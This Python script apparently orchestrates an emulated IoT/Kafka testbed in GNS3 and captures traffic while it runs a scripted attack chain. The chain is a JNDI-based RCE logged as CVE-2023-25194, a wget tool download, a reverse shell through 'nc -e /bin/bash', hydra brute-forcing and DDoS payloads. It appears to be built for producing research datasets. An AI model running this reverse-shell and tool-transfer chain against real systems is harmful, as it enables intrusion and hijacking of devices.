"""Run scenario using the iot simulation topology (gotham scenario)."""

import logging
import random

from config_sinetstream import (
    iot_devices,
    nodes_with_ssh,
    kafka_topic,
    mqtt_topics_to_connect,
    nc_port,
    w_time_legitimate_only_before_attack,
    w_time_end_ddos_to_end_scenario,
    w_time_cve_exploitation_openrevshell,
    w_time_openrevshell_toolstransfert,
    w_time_toolstransfert_nmap,
    w_time_nmap_hydra,
    w_time_hydra_mqttsa_scp,
    w_time_scp_coordinated_launch,
    DDoS_only,
    nmap_args,
    mqttsa_args,
    target_mqtt_broker_ip,
    hydra_args,
    PROJECT_NAME,
    max_time_creds_bruteforce,
)
from constants import *
from run_scenario_utils_sinetstream_attack import *
from startuputils import startup_proj


def configure_start_devices(
    server,
    project,
    iot_devices: Dict[str, Dict[str, str]],
    dns_id,
    inter_iot_device_timesleep: int = 2,
    mqtt_brokers: list[Item] = None,
    wait_ping_connectivity: bool = False,
) -> Dict[str, Dict[str, str]]:
    """
    :param server:
    :param project:
    :param iot_devices: Dict with key = names of nodes to be started and value = (possibly empty) Dict of new env. variables for nodes
    :return: the same dict as iot_devices with only the iot_nodes that failed to start
    """

    nodes_failed: Dict[str, Dict[str, str]] = {}

    # shuffling the order devices are started. This allows to balance load on routers and dns
    shuffled_devices = list(iot_devices.keys())
    random.shuffle(shuffled_devices)
    ip_to_node = {}
    if mqtt_brokers:
        ip_to_node: dict[str, gns3fy.Node]
        for item_mqtt_broker in mqtt_brokers:
            ip_to_node[get_ip_by_gns3_api(server, project, item_mqtt_broker)[1]] = (
                project.gns3fy_proj.get_node(name=item_mqtt_broker.name)
            )

    print(f"going to start {len(iot_devices)} IoT sensors/MQTT publishers")
    for device in shuffled_devices:
        new_env_vars = iot_devices[device]
        # get node environment
        print(f"node {device}, setting ENV...", end=" ")
        node = get_nodes_id_by_name_regexp(
            server, project, re.compile(device, re.IGNORECASE)
        )
        print("nnn", node)
        if node is None:
            print(f"No node with name {device}")
            continue
        node = node[0]
        node_env = get_docker_node_environment(server, project, node.id)
        if node_env:
            env = environment_string_to_dict(node_env)
            for new_env_var_name, new_env_var_value in new_env_vars.items():
                env[new_env_var_name] = new_env_var_value
            if "TLS" in env.keys() and env["TLS"]:
                if env[MQTT_BROKER_ADDR] != MQTT_CLOUD_TLS_NAME[0]:
                    print(
                        f"Warning! {node.name}: config asked {env[MQTT_BROKER_ADDR]=} while this node has TLS enabled. "
                        f"Overwrite MQTT_BROKER_ADDR env variable with {MQTT_CLOUD_TLS_NAME[0]}"
                    )
                env["MQTT_BROKER_ADDR"] = MQTT_CLOUD_TLS_NAME[0]
        else:
            env = {}
        env["NTP_SERVER"] = NTP_CLOUD_NAME[0]
        # update node environment
        update_docker_node_environment(
            server, project, node.id, environment_dict_to_string(env)
        )
        # start node
        print(f"Starting node...")
        if project.gns3fy_proj.get_node(node_id=node.id).status != "started":
            start_node(server, project, node.id)

            if wait_ping_connectivity:
                if (
                    reverse_ping_if_failure(
                        server, project, node.id, dns_id, ip_to_node
                    )
                    != 0
                ):
                    nodes_failed[node.name] = iot_devices[node.name]
            # TODO, <check if timeout can be reduced
            time.sleep(inter_iot_device_timesleep)
        else:
            print("was already started")
        print("continue to next IoT device")
    return nodes_failed


def start_nodes_and_capture(
    server,
    project,
    CAPTURE: Dict[str, bool],
    PUBLISHERS: bool,
    ATTACKERS: bool,
    iot_devices: Dict[str, Dict[str, str]],
):
    router_ids = start_all_routers(server, project, sleeptime=1)
    start_all_switches(server, project)

    all_iot = get_nodes_id_by_name_regexp(
        server, project, re.compile("iotsim-.*", re.IGNORECASE)
    )
    general_services = list(
        filter(
            lambda n: re.search(re.compile(r"dns|ntp", re.IGNORECASE), n.name), all_iot
        )
    )
    mqtt_borkers_pattern = re.compile(r".*mqtt-broker-.*", re.IGNORECASE)
    iot_servers: list[Item] = list(
        filter(
            lambda n: re.search(mqtt_borkers_pattern, n.name),
            all_iot,
        )
    )
    for n in general_services + iot_servers:
        print(f"Starting {n.name}", end=" ")
        if project.gns3fy_proj.get_node(node_id=n.id).status == "started":
            print("was already started")
        else:
            start_node(server, project, n.id)
            time.sleep(0.1)
            print("")

    if CHECK_CONNECTIVITY:
        print("waiting for routers to exchange neighbors routing information")
        time.sleep(40)
        check_connectivity(
            server,
            project,
            mqtt_borkers_pattern,
            re.compile("VyOS1.3.0-(5|6)$", re.IGNORECASE),
            ping_timeout_arg=20,
        )
    time.sleep(2)
    if CAPTURE["mqtt-publishers"]:
        start_capture_all_iot_links(
            server,
            project,
            re.compile("VyOS1.3.0-1$", re.IGNORECASE),
            re.compile("VyOS1.3.0-2$", re.IGNORECASE),
        )
    if CAPTURE["mqtt-attackers"]:
        start_capture_all_iot_links(
            server,
            project,
            re.compile("VyOS1.3.0-1$", re.IGNORECASE),
            re.compile("VyOS1.3.0-3$", re.IGNORECASE),
        )
    if CAPTURE["SINETStream"]:
        kafka_connect: gns3fy.Node = project.gns3fy_proj.get_node(
            name=kafka_connect_name
        )
        if kafka_connect is None:
            print(f"No node with name {kafka_connect_name}. Ignore sinetStream capture")
        else:
            sinetstream_switch_id = get_connected_nodes(
                project.gns3fy_proj, kafka_connect.node_id
            )[0]
            switch_name = project.gns3fy_proj.get_node(
                node_id=sinetstream_switch_id
            ).name
            start_capture_all_iot_links(
                server,
                project,
                re.compile(kafka_connect_name, re.IGNORECASE),
                re.compile(switch_name, re.IGNORECASE),
            )
            start_capture_all_iot_links(
                server,
                project,
                re.compile(".*zookeeper.*", re.IGNORECASE),
                re.compile(switch_name, re.IGNORECASE),
            )

    dns_id: str = list(
        filter(lambda n: re.search(re.compile(r"dns", re.IGNORECASE), n.name), all_iot)
    )[0].id
    if PUBLISHERS:
        nodes_to_retry = configure_start_devices(
            server,
            project,
            iot_devices,
            dns_id,
            inter_iot_device_timesleep=0,
            mqtt_brokers=iot_servers,
            wait_ping_connectivity=True,
        )
        if len(nodes_to_retry.keys()) != 0:
            print(
                f"{len(nodes_to_retry.keys())} nodes failed to start: retry: {nodes_to_retry.keys()}"
            )
            nodes_definitive_fail = configure_start_devices(
                server,
                project,
                nodes_to_retry,
                dns_id,
                inter_iot_device_timesleep=10,
                mqtt_brokers=iot_servers,
                wait_ping_connectivity=True,
            )
            print(f"{len(nodes_definitive_fail.keys())} nodes failed to start twice.")
            if len(nodes_definitive_fail.keys()) > 0:
                print(
                    f"Following nodes are not started. It may lead to errors. {nodes_definitive_fail.keys()}"
                )
        else:
            print(f"0 nodes failed to start")
    if ATTACKERS:
        attacker_nodes = {
            attacker_node_name: {}
            for attacker_node_name in (
                "iotsim-scanner-1",
                "iotsim-mqtt-attacks-1",
                "iotsim-metasploit-1",
                # "iotsim-amplification-coap-1",
                "iotsim-mqtt-malaria-1",
            )
        }
        configure_start_devices(
            server, project, attacker_nodes, dns_id, inter_iot_device_timesleep=10
        )
    project.gns3fy_proj.get()


STATE = "1"
PUBLISHERS = True
ATTACKERS = True
LAUNCH_SINETSTREAM_ATTACK = True
CAPTURE = {"mqtt-publishers": True, "mqtt-attackers": True, "SINETStream": True}
CHECK_CONNECTIVITY = True

server, project, sim_config = startup_proj(PROJECT_NAME, False)

times_file_path: Path = Path(f"times_{PROJECT_NAME}.txt")

sinetstream_mqtt_broker_name = "iotsim-mqtt-broker-1.6-1"
kafka_connect_name = "sinetstream-connect-kafka-1"
client_connect_name = "sinetstream-client-connect-1"
kafka_broker_name = "sinetstream-kafka-broker-1"

attack_args: AttackArguments = AttackArguments(
    server,
    project,
    w_time_toolstransfert_nmap,
    w_time_nmap_hydra,
    w_time_hydra_mqttsa_scp,
    w_time_scp_coordinated_launch,
    nmap_args,
    hydra_args,
    mqttsa_args,
    target_mqtt_broker_ip,
    times_file_path,
    project.gns3fy_proj.get_node(name=kafka_connect_name).node_id,
    int(max_time_creds_bruteforce),
)
watched_str = "mqttsa"
nodes_launching_ddos = []
ddos_times_start_end: dict[str, list[datetime, datetime]] = {}


iot_devices, nodes_with_ssh, mqtt_topics_to_connect = check_config(
    project.gns3fy_proj, iot_devices, nodes_with_ssh, mqtt_topics_to_connect
)

if STATE == "1":

    start_nodes_and_capture(
        server, project, CAPTURE, PUBLISHERS, ATTACKERS, iot_devices
    )
    opennssh_all_nodes(server, project, nodes_with_ssh)

    sinetstream_nodes = start_sinetstream_nodes(
        server,
        project,
        SINETSTREAM_TEMPLATE_NAMES,
        sinetstream_mqtt_broker_name,
    )
    if sinetstream_nodes is not None:
        client_delete_previous_connectors(
            server,
            project,
            project.gns3fy_proj.get_node(name=client_connect_name).node_id,
            get_node_ip(server, project, node_name=kafka_connect_name),
        )

        connect_ip = get_node_ip(server, project, node_name=kafka_connect_name)
        client_connect_ip = get_node_ip(server, project, node_name=client_connect_name)
        kafka_broker_ip = get_node_ip(server, project, node_name=kafka_broker_name)
        # register mqtt topics to kafka topics
        for mqtt_broker_name, mqtt_topics in mqtt_topics_to_connect.items():
            broker_creds = None
            if mqtt_broker_name == "iotsim-mqtt-broker-1.6-auth-1":
                broker_creds = ("admin", "adminpass")
            register_mqtt_topic_to_kafka_topic(
                server,
                project,
                sinetstream_nodes,
                mqtt_broker_name,
                connect_ip,
                client_connect_name,
                kafka_topic,
                mqtt_topics,
                broker_creds,
            )

        time.sleep(w_time_legitimate_only_before_attack)

        if DDoS_only:
            print(f"{DDoS_only=}")
            nodes_launching_ddos = ddos_only(
                server,
                project,
                attack_args,
                list(node_dos for node_dos, _, _ in nodes_with_ssh),
                Path("../Dockerfiles/mqtt-connect-kafka/client_connect/tools/mqttsa"),
            )
            ddos_times_start_end = get_time_all_containers_do_not_execute_cmd(
                server,
                project,
                watched_str,
                nodes_launching_ddos,
                60 * 5 * len(nodes_launching_ddos),
            )
            print("finished DDoS payload execution")

        elif LAUNCH_SINETSTREAM_ATTACK:
            # starting attack
            start_rogue_jndi(server, project, sinetstream_nodes, client_connect_name)
            start_file_server(server, project, sinetstream_nodes, client_connect_name)

            tn_connection: Telnet = open_nc_listener(
                server,
                project,
                sinetstream_nodes[client_connect_name]["node_id"],
                nc_port,
            )

            # send and install tools
            file = "tools.zip"
            cmd = "cd /tmp;rm -rf tools*;"
            cmd += f"wget -q -O {file} http://{client_connect_ip}:8080/{file};"
            cmd += (
                f"unzip -qq {file};"
                "cd tools/hydra;"
                "./configure --prefix=/tmp --disable-xhydra;make;make install;"
                "cd ..;"
                "tar -xzf sps.gz;"
                "cd sshpass-1.10/;"
                "./configure;make;"
                f"cd ..; sleep {w_time_cve_exploitation_openrevshell};"
                f"nc {client_connect_ip} {nc_port} -e /bin/bash"
            )
            # starting reverse shell with nc
            print(cmd.replace(";", "\n"))
            with open(attack_args.path_times_file, "a") as ftimes:
                print(
                    f"start cve_2023_25194_exploitation {client_connect_ip} {datetime.datetime.now(datetime.timezone.utc)}",
                    file=ftimes,
                )
                print(
                    f"start revshell {connect_ip}:{nc_port} {datetime.datetime.now(datetime.timezone.utc)}",
                    file=ftimes,
                )
                rce_on_connect(
                    server,
                    project,
                    client_connect_name,
                    client_connect_ip,
                    connect_ip,
                    kafka_broker_ip,
                    sinetstream_nodes,
                    cmd,
                )
                print(
                    f"finished cve_2023_25194_exploitation {client_connect_ip} {datetime.datetime.now(datetime.timezone.utc)}",
                    file=ftimes,
                )

            print(
                "finished 1st RCE: tools transfered to customconnect, reverseshell open"
            )
            time.sleep(w_time_openrevshell_toolstransfert)
            node_ssh_name_to_ip = {
                name: get_node_ip(server, project, node_name=name)
                for name in (nn[0] for nn in nodes_with_ssh)
            }
            try:
                attack_args.tn = tn_connection
                attack_args.ip_kafka_connect = connect_ip
                hydra_output = rce_via_nc_revshell(attack_args)
                nodes_launching_ddos = get_name_nodes_ddos_payload(
                    hydra_output, node_ssh_name_to_ip
                )
            finally:
                tn_connection.close()
            logging.basicConfig(
                filename="logging_gothX.log",
                filemode="a",
                format="%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s",
                datefmt="%H:%M:%S",
                level=logging.DEBUG,
            )

            ddos_times_start_end = get_time_all_containers_do_not_execute_cmd(
                server,
                project,
                watched_str,
                nodes_launching_ddos,
                60 * 5 * len(nodes_launching_ddos),
            )
            logging.info("finished DDoS payload execution")
            logger = logging.getLogger()
            logger.handlers[0].flush()
            with open(attack_args.path_times_file, "a") as fout:
                print(
                    f"end revshell {connect_ip}:{nc_port} {datetime.datetime.now(datetime.timezone.utc)}",
                    file=fout,
                    flush=True,
                )

    # if a DDoS was launched (only DDoS or full scenario LAUNCH_SINETSTREAM_ATTACK)
    if len(ddos_times_start_end) > 0:
        with open(attack_args.path_times_file, "a") as fout:
            times_with_ip = {
                f"{name_iot_compromised}#{get_node_ip(server, project, name_iot_compromised)}": timings
                for name_iot_compromised, timings in ddos_times_start_end.items()
            }
            print(times_with_ip, file=fout)

    time.sleep(w_time_end_ddos_to_end_scenario)

stop_capture_all_iot_links(
    server,
    project,
    re.compile("VyOS.*1$", re.IGNORECASE),
    re.compile("VyOS.*", re.IGNORECASE),
)
stop_capture_all_iot_links(
    server,
    project,
    re.compile(".*sinetstream.*", re.IGNORECASE),
    re.compile(".*openvswitch.*", re.IGNORECASE),
)

all_nodes = get_all_nodes(server, project)
print(f"Stopping all  {len(all_nodes)} nodes")
for idx_node, node in enumerate(all_nodes):
    print(len(all_nodes) - idx_node, end=".")
    stop_node(server, project, node["node_id"])

input("\nwaiting any user input to end program ")
